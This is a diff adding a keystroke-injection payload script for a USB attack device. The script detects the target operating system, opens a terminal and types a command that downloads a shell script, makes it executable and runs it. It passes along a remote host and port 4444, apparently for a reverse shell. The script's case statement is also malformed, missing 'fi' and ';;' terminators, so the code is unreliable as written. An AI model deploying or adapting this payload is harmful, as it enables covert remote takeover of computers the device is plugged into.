@@ -1,0 +1,25 @@
+#!/bin/bash
+ATTACKMODE HID STORAGE AUTO_ETHERNET
+python -m SimpleHTTPServer > /dev/null 2>&1 &
+GET TARGET_OS
+GET SWITCH_POSITION
+RHOST=t.angelparliament.com
+RPORT=4444
+case "$TARGET_OS" in
+	WINDOWS)
+		LED R
+		if [ -f "/root/udisk/payloads/${SWITCH_POSITION}/windows.txt" ]; then
+        	Q ${SWITCH_POSITION}/windows.txt
+	MACOS)
+		LED G
+		if [ -f "/root/udisk/payloads/${SWITCH_POSITION}/mac.txt" ]; then
+        	Q ${SWITCH_POSITION}/mac.txt
+	LINUX)
+		LED B
+		Q CTRL-ALT t
+		sleep 1
+		LED STAGE1
+		Q STRING "curl http://172.16.64.1:8000/a.sh > ~/a.sh && chmod +x ~/a.sh && ~/a.sh $RHOST $RPORT && exit"
+		Q ENTER
+esac
+LED FINISH
